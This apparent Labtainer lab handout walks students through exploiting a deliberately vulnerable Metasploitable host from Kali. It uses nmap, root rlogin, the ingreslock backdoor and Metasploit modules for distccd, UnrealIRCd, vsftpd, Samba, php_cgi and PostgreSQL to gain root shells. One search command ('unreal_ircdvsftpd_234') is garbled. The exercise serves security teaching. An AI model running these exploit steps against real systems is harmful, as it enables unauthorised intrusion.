Title: Metasploit Lab Exercise

1. Background

This Labtainer exercise explores the use of metasploit tool
installed on Kali Linux (attacker) to learn simple penetration skill
on a purposely vulnerable metasploitable host (victim).

Note: attacker is configured to have IP address 192.168.1.3 while
      victim is 192.168.1.2

2. Performing the lab
The lab is started from the Labtainer working 
directory on your Docker-enabled host, e.g., a Linux VM.
From there, issue the command:

    start.py metasploit

The resulting virtual terminals include a display of
these instructions, and a terminal connected to attacker.

To navigate this instruction, the arrow keys along with 
with the Space/Home/End/Page-Up/Page-Down keys are usable.
To exit navigation of this instruction, type 'q'.

3. Tasks

3.1. Verify connectivity between attacker and victim

     A simple ping from the attacker system will be sufficient.
     ping 192.168.1.2

3.2. Get a list of vulnerable services on the victim

     An 'nmap' scan of the victim will be sufficient.
     nmap -p0-65535 192.168.1.2

3.3. Vulnerably configured rlogin service (port 513)

     Remote login to the victim (with root privilege)
     rlogin -l root 192.168.1.2

     Display a 'root' file
     cat /root/filetoview.txt

3.4. Vulnerable ingreslock service (port 1524)

     Use telnet to access ingreslock service and obtain root privilege
     telnet 192.168.1.2 1524

     Display root file as above

3.5. Vulnerable distccd service (port 3632)

     Initialize/connect to postgres database (done only once)
     sudo msfdb init

     Start Metasploit console
     sudo msfconsole
     [NOTE: When using msfconsole in this lab, use of ctl-c will
      exit the msfconsole program.  Normally, ctl-c would not
      terminate msfconsole.  This is a Labtainers limitation.]

     search for distccd exploit
     search distccd

     Use the exploit
     use exploit/unix/misc/distcc_exec

     View options related to exploit
     options

     Set the 'RHOST' option
     set RHOST 192.168.1.2

     Run the exploit
     exploit

     Note: when the exploit is succeeded, no prompt is shown but
           a shell is created

     Display root file as above

3.6. Vulnerable IRC daemon (port 6667)

     Steps are similar to distccd exploit above
     
     search for unreal_ircd exploit
     search unreal_ircd

     Use the exploit
     use exploit/unix/irc/unreal_ircd_3281_backdoor

     view and set options as necessary (RHOST option)
     run the exploit and display root file

3.7. Vulnerable VSFtpd service (port 21)

     Steps are similar to distccd exploit above
     
     search for vsftpd_234
     search unreal_ircdvsftpd_234

     Use the exploit
     use exploit/unix/ftp/vsftpd_234_backdoor

     view and set options as necessary (RHOST option)
     run the exploit and display root file

3.8. Vulnerable Samba service (port 139)

     Steps are similar to distccd exploit above
     
     search for samba usermap_script
     search usermap_script

     Use the exploit
     use exploit/multi/samba/usermap_script

     view and set options as necessary (RHOST option)
     run the exploit and display root file

3.9. Vulnerable HTTP (php) service (port 80)

     Steps are similar to distccd exploit above
     
     search for php_cgi
     search php_cgi

     Use the exploit
     use exploit/multi/http/php_cgi_arg_injection

     view and set options as necessary (RHOST option)
     run the exploit

     Note: when the exploit is succeeded a 'meterpreter' prompt is shown
     
     From meterpreter prompt, drop to a shell
     shell

     Display root file

3.10. Vulnerable PostGres service (port 5432)

     Steps are similar to distccd exploit above
     
     search for postgres_payload
     search postgres_payload

     Use the exploit
     use exploit/linux/postgres/postgres_payload

     view and set options as necessary (RHOST option)
     run the exploit

     Note: when the exploit is succeeded a 'meterpreter' prompt is shown
     
     From meterpreter prompt, drop to a shell
     shell

     Display root file

4. Stop the Labtainer

When the lab is completed, or you'd like to stop working for a while, run

    stop.py metasploit

from the host Labtainer working directory.  You can always restart the
Labtainer to continue your work.  When the Labtainer is stopped, a
zip file is created and copied to a location displayed by the stop.py
command.  When the lab is completed, send that zip file to the instructor.

